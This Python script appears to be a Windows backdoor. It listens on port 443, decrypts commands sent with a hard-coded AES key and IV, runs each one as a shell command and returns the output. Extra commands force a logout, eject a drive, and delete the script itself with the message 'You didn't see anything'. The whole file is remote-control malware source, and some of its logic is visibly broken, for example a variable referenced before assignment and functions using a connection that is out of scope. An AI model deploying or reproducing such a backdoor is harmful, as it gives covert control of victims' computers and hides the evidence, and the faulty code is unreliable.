#!/usr/bin/python3
import socket
import sys
from Crypto.Cipher import AES
from _thread import *
import os
import subprocess
objself = 'crss.py'

def popthelid():
	os.system("eject D:")
	outdata = "popped lid"
	forwardmessage()
	conn.send(outdata)

def forwardmessage():
	global outdata
	while len(outdata) % 16 !=0:
		outdata = outdata + '@'
	outdata = encry.encrypt(outdata)
	conn.send(outdata)

def operation_lastresort():
	global outdata
	outdata = "You didn't see anything"
	forwardmessage()
	objself = ("del /f /q " + objself)
	os.system(objself)

def logmeout():
	global outdata
	outdata = "Logging Out System..."
	forwardmessage()
	os.system('shutdown /l /f')


key = "@@@@@@@@@@@@@@@@"
encry = AES.new(key, AES.MODE_CBC, 'This is an IV456')
decry = AES.new(key, AES.MODE_CBC, 'This is an IV456')
HOST = '' #All interfaces
PORT = 443 #Temp
MAXRECV = 1024
err = 'There was a problem with your request'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Creates socket
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((HOST, PORT))
print('Binding Complete On Port: ')
s.listen(50)
print('Socket is now listening....')
print('PORT: ' + str(PORT))
data = "b'\xc1\x0c[{ \x995\xd0\x9b+:\x85\x8f\xab\x8c\xb4'"
def clientThread(conn):
	outdata = "Connection establised"
	while len(outdata) % 16 !=0:
		outdata = outdata + '@'
	outdata = encry.encrypt(outdata)
	conn.send(outdata)
	while True:
		data = conn.recv(MAXRECV)
		if not data:
			break
		data = decry.decrypt(data)
		data = data.decode()
		data = data.replace('@','')
		if data == 'lastresort':
			operation_lastresort()
		if data == 'logmeout':
			logmeout()
		if data == 'popthelid':
			popthelid()
		if "cd" in data:
			outdata = ""
			try:
				data = data.replace('cd ','')
				os.chdir(data)
				outdata = ("Changed dir to: " + data)
			except:
				outdata = "ERR: Couldn't change dir"
			while len(outdata) % 16 !=0:
				outdata = outdata + '@'
			outdata = encry.encrypt(outdata)
			conn.send(outdata)

		else:
			outdata = ""
			outdata = subprocess.check_output(data,shell=True)
			outdata = outdata.decode()
			print(outdata)
			while len(outdata) % 16 !=0:
				outdata = outdata + '@'
			outdata = encry.encrypt(outdata)
			conn.send(outdata)
	conn.close()
while 1:
	conn, addr = s.accept()
	print('Client connected ' + addr[0] + ':' + str(addr[1]))
	start_new_thread(clientThread, (conn,))
s.close()
